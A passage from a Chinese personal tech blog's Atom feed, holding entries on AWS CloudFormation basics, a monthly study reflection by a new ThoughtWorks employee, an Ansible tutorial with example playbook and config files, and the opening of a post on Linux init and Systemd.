      <category term="bash，shell" scheme="http://adu.404nf.cn/tags/bash%EF%BC%8Cshell/"/>
    
  </entry>
  
  <entry>
    <title>AWS之CloudFormation</title>
    <link href="http://adu.404nf.cn/2016/08/02/AWS%E4%B9%8BCloudFormation/"/>
    <id>http://adu.404nf.cn/2016/08/02/AWS之CloudFormation/</id>
    <published>2016-08-02T13:36:04.000Z</published>
    <updated>2016-08-05T02:15:12.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;CloudFormation简介&quot;&gt;&lt;a href=&quot;#CloudFormation简介&quot; class=&quot;headerlink&quot; title=&quot;CloudFormation简介&quot;&gt;&lt;/a&gt;CloudFormation简介&lt;/h1&gt;&lt;p&gt;通过前面的学习我们已经知道了AWS为我们提供服务的方式是将现实世界中的各种需求抽象为很多服务，CloudFormation是一种被定义为管理工具的服务，其作用是把AWS提供的服务按一定方式组合起来，自动化而且可纳入版本管理，作为基础设施及代码的典型应用&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;应用场景&quot;&gt;&lt;a href=&quot;#应用场景&quot; class=&quot;headerlink&quot; title=&quot;应用场景&quot;&gt;&lt;/a&gt;应用场景&lt;/h1&gt;&lt;p&gt;CloudFormation从小到一个EC2大到一个企业级web服务都可以用一个cloudfomation自动生成。&lt;/p&gt;
&lt;h1 id=&quot;如何工作&quot;&gt;&lt;a href=&quot;#如何工作&quot; class=&quot;headerlink&quot; title=&quot;如何工作&quot;&gt;&lt;/a&gt;如何工作&lt;/h1&gt;&lt;p&gt;使用CloudFormation意味着使用模板（template）创建stack。&lt;br&gt;一个模板可以包含一个或者多个资源的信息，并且包含资源之间的关联关系。&lt;br&gt;当你加载一个CloudFormation，你需要一定的权限，这个权限将用于创建指定的资源。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/images/create-stack-diagram.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CloudFormation简介&quot;&gt;&lt;a href=&quot;#CloudFormation简介&quot; class=&quot;headerlink&quot; title=&quot;CloudFormation简介&quot;&gt;&lt;/a&gt;CloudFormation简介&lt;/h1&gt;&lt;p&gt;通过前面的学习我们已经知道了AWS为我们提供服务的方式是将现实世界中的各种需求抽象为很多服务，CloudFormation是一种被定义为管理工具的服务，其作用是把AWS提供的服务按一定方式组合起来，自动化而且可纳入版本管理，作为基础设施及代码的典型应用&lt;/p&gt;
    
    </summary>
    
    
      <category term="AWS DevOps" scheme="http://adu.404nf.cn/tags/AWS-DevOps/"/>
    
  </entry>
  
  <entry>
    <title>六月学习小结</title>
    <link href="http://adu.404nf.cn/2016/07/07/%E5%85%AD%E6%9C%88%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    <id>http://adu.404nf.cn/2016/07/07/六月学习小结/</id>
    <published>2016-07-07T13:46:15.000Z</published>
    <updated>2016-07-09T03:12:46.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;不知不觉进入ThoughtWorks已经快两个月了，两个月以来不能说没有变化，但是心境确是经历了起伏波折，七月的主题是，危机，让我存活。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;上月回顾&quot;&gt;&lt;a href=&quot;#上月回顾&quot; class=&quot;headerlink&quot; title=&quot;上月回顾&quot;&gt;&lt;/a&gt;上月回顾&lt;/h1&gt;&lt;p&gt;来到ThoughtWorks的一个阶段的任务应该概括为能力基线建设，基本算是达标，&lt;br&gt;另外，英语和沟通的提升还是差强人意。&lt;/p&gt;
&lt;h1 id=&quot;六月一览&quot;&gt;&lt;a href=&quot;#六月一览&quot; class=&quot;headerlink&quot; title=&quot;六月一览&quot;&gt;&lt;/a&gt;六月一览&lt;/h1&gt;&lt;p&gt;六月份很长的时间都在睡不醒的状态，刚找到新工作，很多事情都没有理顺，孤独感一如既往地拜访，同时我发现一个问题，我看问题的时候太自我，太个人化，缺乏全局观。恩，这是我需要解决的自己的问题。&lt;br&gt;六月在公司做了的事情基本上只有摸索，尝试不同的学习方式，成效不是很明显.&lt;br&gt;应该说在六月我取得了以下技能：&lt;br&gt;Ansible: 知道了这是一款自动化配置管理工具，和它的一些常见的使用方法。&lt;br&gt;AWS：学会并使用了AWS的EC2,S3,RDS,VPC,IAM,Cloudformation，云服务应该是我在这个项目中最感兴趣的地方。&lt;br&gt;Linux:应该说掌握了一些shell命令，但是还不熟练，也不系统，Vim可以简单使用了，但是对于高级操作基本上还是知道得很少。&lt;br&gt;Jenkins：因为项目上用到，所以Jenkins可以说还算比较熟悉。&lt;br&gt;思维模式：开始意识到自己的思维很多时候并不够逻辑严谨，不成系统，这是需要锻炼和改进的地方。&lt;br&gt;英语水平：基本满足项目需求了，但是在表达自己的意思，和一些书面的用法上还差得很远。&lt;br&gt;git: 虽然重新学习了一下git,但是效果并不理想，还是不够系统，没有学到点子上。&lt;br&gt;做一个简单的总结，六月份的学习大部分时候都是在完成别人安排给我的任务，自己缺乏主动性，也没有真正主动地去学习什么，从压力的适度性上来讲，整体压力是不够的，导致前期的懈怠，然后后期压力加大又有些受不了。所以自己需要调整学习节奏，便主动为被动，同时安排好后期的学习任务，在保证新知识正常吸收的前提下，还要把旧的还没有做的事情给做了。&lt;/p&gt;
&lt;h1 id=&quot;未完成&quot;&gt;&lt;a href=&quot;#未完成&quot; class=&quot;headerlink&quot; title=&quot;未完成&quot;&gt;&lt;/a&gt;未完成&lt;/h1&gt;&lt;p&gt;我需要翻译博文给我的那份文档，然后要把WordPress做到动静态文件分离之后部署在AWS的资源上，我需要学习nodejs，我需要系统地学习一下Linux和git，以及学习java的web编程，在一个以java为主要技术栈的团队里，这应该是必不可少的。&lt;br&gt;公司的study和people制度并没有想象中那么理想，革命主要还是靠自觉。周五再分点过一下人物，安排一下在下周必须完成旧任务以进行下一轮的学习。&lt;/p&gt;
&lt;h1 id=&quot;七月计划&quot;&gt;&lt;a href=&quot;#七月计划&quot; class=&quot;headerlink&quot; title=&quot;七月计划&quot;&gt;&lt;/a&gt;七月计划&lt;/h1&gt;&lt;p&gt;主要是准备AWS认证。另外一个关于Ansible+AWS的session既然答应下来了还是把它讲了吧，也作为本月的一个output。&lt;br&gt;其实后来反省了一下自己，做事不能带情绪。做事就是做事，不要一开始就带着一种观点，或者把对别人的偏见带到工作中，情绪化是我的一大弱点，不管是在写文档的时候还是在观点碰撞的时候，需要注意。&lt;br&gt;对于接下来的时间我有三个要求：&lt;br&gt;1.认真讲那个show case，尽量让他变成一个有意义的事情。&lt;br&gt;2.开始看AWS文档，准备AWS认证初级考试。（看得比较慢一开始可以尝试翻译）&lt;br&gt;3.重新开始看书，从Linux开始，看程序员该看的书。&lt;br&gt;(今后写东西尽量做到逻辑性强一些，思维结构尽可能清晰，然后就是对上一阶段的总结和下一阶段的计划分别不超过三件事，这样让我集中精力也更容易抓住重点。)&lt;/p&gt;
&lt;h1 id=&quot;写在最后&quot;&gt;&lt;a href=&quot;#写在最后&quot; class=&quot;headerlink&quot; title=&quot;写在最后&quot;&gt;&lt;/a&gt;写在最后&lt;/h1&gt;&lt;p&gt;一直想有一个关于旅行的分享，不知道在公司能不能有这个机会，下个月的任务应该包含这部分的内容，走得太快了，真的快要忘记自己了。书也不看了，这个月真的不是很在状态，七月加油！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;不知不觉进入ThoughtWorks已经快两个月了，两个月以来不能说没有变化，但是心境确是经历了起伏波折，七月的主题是，危机，让我存活。&lt;br&gt;
    
    </summary>
    
      <category term="study" scheme="http://adu.404nf.cn/categories/study/"/>
    
    
      <category term="小结" scheme="http://adu.404nf.cn/tags/%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>ansible学习小记</title>
    <link href="http://adu.404nf.cn/2016/06/15/Ansible%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
    <id>http://adu.404nf.cn/2016/06/15/Ansible学习小记/</id>
    <published>2016-06-15T12:30:46.000Z</published>
    <updated>2016-10-24T07:23:25.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;Ansible是什么&quot;&gt;&lt;a href=&quot;#Ansible是什么&quot; class=&quot;headerlink&quot; title=&quot;Ansible是什么&quot;&gt;&lt;/a&gt;Ansible是什么&lt;/h1&gt;&lt;p&gt;借助官网上的一句话，ansible is a simple IT automation, 即ansible 是用于IT自动化管理的一个工具&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;诞生背景&quot;&gt;&lt;a href=&quot;#诞生背景&quot; class=&quot;headerlink&quot; title=&quot;诞生背景&quot;&gt;&lt;/a&gt;诞生背景&lt;/h2&gt;&lt;p&gt;在传统小规模开发中，我们在开发机上开发，在Linux服务器上部署，整个过程只需要一个人操作，运维既是在开发机上开发，测试，然后选个凌晨两三点的时间把打包好的字节码文件复制到服务器上，这种开发生产环境用不着自动化配置管理工具。&lt;br&gt;但当我们的开发升级到数十个人的团队，服务器多达数台，这种操作方式的弊端就会显露出来，一是多人协作带来的开发环境和生产环境不一致导致开发环境可用的代码到了生产环境（服务器）上变得不可用，二是多台服务器的重复配置带来的工作内容的冗余，一定程度上降低了我们的生产效率。这种时候运维的角色开始逐渐显现出来。&lt;br&gt;这种级别的运维，通常只需要一些python或者bash脚本就可以实现自动化部署，配置服务器等功能。再加上规范的文档，基本可以解决团队之间的沟通问题。&lt;br&gt;但是随着产品迭代周期的加长，团队的扩大，问题也随之而来，实践中脚本的不易维护，程序员们不愿意更新文档等问题逐渐暴露出来。于是市面上诞生了一批以”代码即文档”为核心思想的自动化配置管理工具，Ansible就是其中之一。&lt;/p&gt;
&lt;h2 id=&quot;操作方法&quot;&gt;&lt;a href=&quot;#操作方法&quot; class=&quot;headerlink&quot; title=&quot;操作方法&quot;&gt;&lt;/a&gt;操作方法&lt;/h2&gt;&lt;p&gt;ansible主要由几个部分租成，其核心是inventory文件和yaml编写的playbook，按照&lt;a href=&quot;http://docs.ansible.com/ansible/playbooks_best_practices.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;最佳实践&lt;/a&gt;的标准，一个完整的ansible文件应该具有以下结构：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;production                # inventory file for production servers&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;staging                   # inventory file for staging environment&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;group_vars/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   group1                 # here we assign variables to particular groups&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   group2                 # &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;host_vars/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   hostname1              # if systems need specific variables, put them here&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   hostname2              # &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;library/                  # if any custom modules, put them here (optional)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;filter_plugins/           # if any custom filter plugins, put them here (optional)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;site.yml                  # master playbook&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;webservers.yml            # playbook for webserver tier&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dbservers.yml             # playbook for dbserver tier&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;roles/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    common/               # this hierarchy represents a &amp;quot;role&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        tasks/            #&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            main.yml      #  &amp;lt;-- tasks file can include smaller files if warranted&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        handlers/         #&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            main.yml      #  &amp;lt;-- handlers file&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        templates/        #  &amp;lt;-- files for use with the template resource&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ntp.conf.j2   #  &amp;lt;------- templates end in .j2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        files/            #&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bar.txt       #  &amp;lt;-- files for use with the copy resource&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            foo.sh        #  &amp;lt;-- script files for use with the script resource&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        vars/             #&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            main.yml      #  &amp;lt;-- variables associated with this role&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        defaults/         #&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            main.yml      #  &amp;lt;-- default lower priority variables for this role&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        meta/             #&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            main.yml      #  &amp;lt;-- role dependencies&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    webtier/              # same kind of structure as &amp;quot;common&amp;quot; was above, done for the webtier role&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    monitoring/           # &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fooapp/               # &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里我挑几个重点讲：&lt;br&gt;site.yml是ensile playbook的入口文件，执行该文件会依次找到inventory文件，找到hosts组，然后ssh到目标机器组的host上，开始执行task。&lt;br&gt;task是通过调用ansible模块的方式，在远程设备上执行命令来实现配置的，所以理论上可以通过命令行操作的操作，ansible都可以执行。&lt;br&gt;以下为一个task:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-name: install npm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; sudo: yes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; yum: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	name: npm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	state: present&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;该task使用了ansible的yum模块，用于检测远端设备上是否部署了nam，如果没有部署，ansible会进行yum install nam 操作进行安装，安装成功，显示ok，失败则抛出异常并中断ansible执行。&lt;/p&gt;
&lt;h2 id=&quot;几款自动化配置工具&quot;&gt;&lt;a href=&quot;#几款自动化配置工具&quot; class=&quot;headerlink&quot; title=&quot;几款自动化配置工具&quot;&gt;&lt;/a&gt;几款自动化配置工具&lt;/h2&gt;&lt;p&gt;我没有使用过其他自动化配置管理工具，在此仅对ansible做进一步介绍&lt;br&gt;ensile的底层实现使用python，在Linux上支持较好，windows支持较弱，因为生产环境和测试环境通常都是Linux操作系统，所以这点无伤大雅。&lt;br&gt;你可以理解成Ansible就是对一批python脚本的封装,你只需要更改一些yams文件就可以达到控制服务器配置版本信息的目的，关于yams语法：&lt;a href=&quot;http://www.ansible.com.cn/docs/YAMLSyntax.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.ansible.com.cn/docs/YAMLSyntax.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;如何使用&quot;&gt;&lt;a href=&quot;#如何使用&quot; class=&quot;headerlink&quot; title=&quot;如何使用&quot;&gt;&lt;/a&gt;如何使用&lt;/h1&gt;&lt;h2 id=&quot;Ansible的不足之处&quot;&gt;&lt;a href=&quot;#Ansible的不足之处&quot; class=&quot;headerlink&quot; title=&quot;Ansible的不足之处&quot;&gt;&lt;/a&gt;Ansible的不足之处&lt;/h2&gt;&lt;p&gt;ansible作为一种自动化管理工具实践，形成了一种标准 ，这种标准在实践的过程中难免会有一些不足，比如说既定的命令行和Ansible模块之间的使用存在着一定差距，需要使用的命令行不一定在Ansible中能够找到对应的模块。另外Ansible对于变量的管理也令人诟病，大量的Ansible-playbook如果不按照最佳实践管理变量，或者大量使用冗余变量，会导致文件层级增多，非常难以阅读。。所以在一开始编写Ansible的时候推荐参照最佳实践。但同时我觉得最佳实践文件分德有点太细了，比如说task和vars分开的方式并不能适应很多场景。。好吧但总的来说，Ansible仍是目前管理Linux平台的一个不错的工具。&lt;/p&gt;
&lt;h2 id=&quot;work-with-ansible&quot;&gt;&lt;a href=&quot;#work-with-ansible&quot; class=&quot;headerlink&quot; title=&quot;work with ansible&quot;&gt;&lt;/a&gt;work with ansible&lt;/h2&gt;&lt;p&gt;这是我写的一个Ansible文件用来create 一个instance 然后在instance上自动化部署我的博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ADU-21/create_hexo_in_ec2_with_ansible&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ADU-21/create_hexo_in_ec2_with_ansible&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面我来教大家一起写一个自己的ansible-playbook&lt;br&gt;首先创建一个host.ini文件:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[host]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;localhost&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个文件用于指定配置的机器&lt;br&gt;接下来是ansible.cfg，用于指定ansible-pylbook的参数&lt;br&gt;这里包含了inventory和登录到远程设备需要的private key以及remote user:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[defaults]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;inventory = host.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;private_key_file = ~/.ssh/devenv-key.pem&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;remote_user = ec2-user&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后是site.yml，也就是我们的playbook，&lt;br&gt;其工作原理大致是ssh到指定机器上然后执行ansible模块对应的python脚本从而进行社别的配置。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;- hosts: local&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  connection: local&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  gather_facts: False&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  roles:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # - create_instance&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    - create_instance_with_cloudformation&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- hosts: test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  roles:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      - config_instance&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      - test_hexo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这和playbook执行的role包含以下含义：从本地连接到local这个组里面的设备，然后执行创建instance 和配置instance 最后测试hexo的工作。&lt;br&gt;接下来在role中是更多的yams使用ansible的模块来达到配置设备的目的。。我就不一一解释了，关于yaml语法可参照文档：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://docs.ansible.com/ansible/YAMLSyntax.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://docs.ansible.com/ansible/YAMLSyntax.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于ansible的模块可参照文档：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://docs.ansible.com/ansible/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://docs.ansible.com/ansible/index.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Ansible是什么&quot;&gt;&lt;a href=&quot;#Ansible是什么&quot; class=&quot;headerlink&quot; title=&quot;Ansible是什么&quot;&gt;&lt;/a&gt;Ansible是什么&lt;/h1&gt;&lt;p&gt;借助官网上的一句话，ansible is a simple IT automation, 即ansible 是用于IT自动化管理的一个工具&lt;br&gt;
    
    </summary>
    
      <category term="Devops" scheme="http://adu.404nf.cn/categories/Devops/"/>
    
    
      <category term="opration" scheme="http://adu.404nf.cn/tags/opration/"/>
    
      <category term="ansible" scheme="http://adu.404nf.cn/tags/ansible/"/>
    
  </entry>
  
  <entry>
    <title>Systemd</title>
    <link href="http://adu.404nf.cn/2016/06/05/Systemd%5B%E8%BD%AC%5D/"/>
    <id>http://adu.404nf.cn/2016/06/05/Systemd[转]/</id>
    <published>2016-06-05T07:55:33.000Z</published>
    <updated>2016-07-07T13:48:11.000Z</updated>
    
    <content type="html">&lt;p&gt;Linux系统的初始化过程：POST加电自检–&amp;gt;BIOS(Boot Sequence)–&amp;gt;加载对应引导上的MBR(bootloader)–&amp;gt;主引导设置加载其BootLoader–&amp;gt;Kernel初始化。Kernel初始化后，就是启动init系统，初始化随系统启动的各种服务。这个init系统有以下几种：&lt;/p&gt;
